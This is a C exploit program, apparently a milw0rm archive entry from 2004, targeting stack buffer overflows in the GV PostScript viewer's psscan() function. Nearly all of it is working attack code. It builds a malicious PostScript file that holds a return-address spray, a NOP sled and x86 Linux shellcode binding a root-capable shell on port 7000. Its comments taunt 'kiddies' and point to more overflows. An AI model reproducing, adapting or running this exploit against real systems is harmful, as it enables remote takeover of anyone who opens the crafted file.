<html><head><title>GV PostScript Viewer Remote Buffer overflow Exploit (2)</title></head><pre>* there are at least 4 other stack buffer overflows, and 2 heap overflows.
 * the first exploit i wrote exploited the one in the GLSA, and this one exploits 
 * that hole and four other ones as well. all of these are in the psscan() function
 * located in the ps.c file: 'grep -nP 'sscanf\(.*?%%.*?%s' ps.c'
 * 
 * gv postscript viewer exploit part deux, infamous42md AT hotpop DOT com
 *
 * ok kiddies you've got choices here!  we can overflow the text buffer at 5
 * different places, we can also overflow the heap at 2 places, and ooh i
 * bet if you look around there are tons of other places as well!
 *
 */
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

#define NOP 0x90
#define NNOPS 512
#define die(x) do{perror(x); exit(EXIT_FAILURE);}while(0)
#define BS 0x10000
#define RETADDR_BYTES 400
#define PS_COMMENT &quot;%!PS-Adobe- ASDF&quot;
#define BOUND_BOX &quot;%%BoundingBox:&quot;
#define ORIENTATION &quot;%%Orientation:&quot;
#define PAGE_ORDER &quot;%%PageOrder:&quot;
#define PAGES &quot;%%Pages:&quot;
#define OUTFILE &quot;h4x0ring_sacr3ts_uncuv3red.ps&quot;

/* call them on port 7000, mine */
char remote[] =
&quot;\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6&quot;
&quot;\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50&quot;
&quot;\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a&quot;
&quot;\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31&quot;
&quot;\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0&quot;
&quot;\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80&quot;
&quot;\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x3b\x2c\x30\xcd\x80&quot;;

    

int main(int argc, char **argv)
{
    int len, x, fd;
    char    buf[BS];
    u_char  methodman = 0x0;
    u_long  retaddr;

    if(argc &lt; 3){
        fprintf(stderr, &quot;Usage: %s &lt; retaddr &gt; &lt; ownage method c b o p r&gt;\n&quot;,
argv[0]);        return EXIT_FAILURE;
    }
    sscanf(argv[1], &quot;%lx&quot;, &amp;retaddr);
    methodman = argv[2][0];

    /* create 3vil buf */
    memset(buf, NOP, BS);
    if(methodman == 'b')
        len = snprintf(buf, BS-1, &quot;%s\n%s&quot;, PS_COMMENT, BOUND_BOX);
    else if(methodman == 'c')
        len = snprintf(buf, BS-1, &quot;%s&quot;, PS_COMMENT);
    else if(methodman == 'o')
        len = snprintf(buf, BS-1, &quot;%s\n%s&quot;, PS_COMMENT, ORIENTATION);
    else if(methodman == 'p')
        len = snprintf(buf, BS-1, &quot;%s\n%s&quot;, PS_COMMENT, PAGES);
    else if(methodman == 'r')
        len = snprintf(buf, BS-1, &quot;%s\n%s&quot;, PS_COMMENT, PAGE_ORDER);
    else{
        printf(
        &quot;Cmon man pick a funkin method!!\n&quot;
        &quot;oh i see, 5 is not enough to choose from??\n&quot;
        &quot;don't worry, there are more, just read the source to find them\n&quot;
        &quot;ok fine, you don't want to overflow the stack, understandable.\n&quot;
        &quot;there are also some heap overflows you picky bastard\n&quot;
        &quot;grep -n sscanf\n&quot;);
        return EXIT_FAILURE;
    }

    for(x = 0; x &lt; RETADDR_BYTES - 3; x += sizeof(retaddr))
        memcpy(buf+x+len, &amp;retaddr, sizeof(retaddr));
    len += x + NNOPS;
    strcpy(buf+len, remote);
    strcat(buf+len, &quot;\n&quot;);
    len += strlen(remote) + 2; 

    /* create the 3vil file */
    if( (fd = open(OUTFILE, O_RDWR|O_CREAT, 0666)) &lt; 0)
        die(&quot;open&quot;);
    
    if(write(fd, buf, len) &lt; 0)
        die(&quot;write&quot;);

    close(fd);
    
    return 0;
}

// milw0rm.com [2004-08-18]</pre></html>